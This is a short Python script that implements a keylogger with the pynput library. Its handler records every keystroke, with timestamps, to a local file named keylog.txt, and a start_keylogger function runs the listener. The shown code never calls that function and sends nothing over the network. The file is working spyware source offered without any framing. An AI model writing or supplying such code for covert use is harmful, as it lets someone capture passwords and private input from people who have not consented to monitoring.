from pynput import keyboard
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(str(e))

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
